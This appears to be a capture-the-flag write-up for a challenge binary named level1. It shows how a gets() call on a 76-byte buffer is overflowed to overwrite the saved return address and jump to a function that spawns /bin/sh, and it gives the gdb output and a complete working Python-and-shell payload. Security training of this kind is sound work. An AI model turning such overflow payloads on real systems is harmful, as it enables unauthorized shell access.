We can observe while decompiling the binary that there is a call to `gets` on a buffer of size 76 and a function named `run` with a call to `system("/bin/sh")` located at `0x08048444`.

We could then use a buffer overflow exploit to replace the value of `eip` stored in the stack to execute the `run` function.

## Investigation

First we need to know how many chars we need to write before starting to write over `eip`. And for that we need to know where it is stored in the stack.
We know that `eip` is stored just after `ebp`
```
(gdb) i r ebp
ebp            0xbffff728       0xbffff728
```
at `0xbffff728 + 0x4 = 0xbffff72c`

Now we will need to know where our buffer is in the stack. For that we can give an input of `aaaaaaaaaaaaaaaa` (ASCII for 'a' is 61) and print the stack.
```
(gdb) x/12xw $esp
0xbffff6d0:     0xbffff6e0      0x0000002f      0xbffff72c      0xb7fd0ff4
0xbffff6e0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff6f0:     0xb7fd1300      0x00000016      0x0804978c      0x080484c1
```
Our buffer start at the address `0xbffff6e0` (0x10 after the start of esp).

If we substract our 2 adresses we get `0xbffff72c - 0xbffff6e0 = 0x4c` or `0d76` so we need to write 76 chars to rewrite the value of `eip` to `0x08048444`.

## Exploit

First we will need to write the address of `run` in little endian `44840408` and add 76 chars before it. In python it should be
```py
print "A"*76 + "\x44\x84\x04\x08"
```
But we will need to have the prompt back to be able to pass command to the shell. For that we will use `cat -`.
Those two combined this will give use
```shell
(cat <(python -c 'print "A" * 76 + "\x44\x84\x04\x08"') -) | ./level1
```
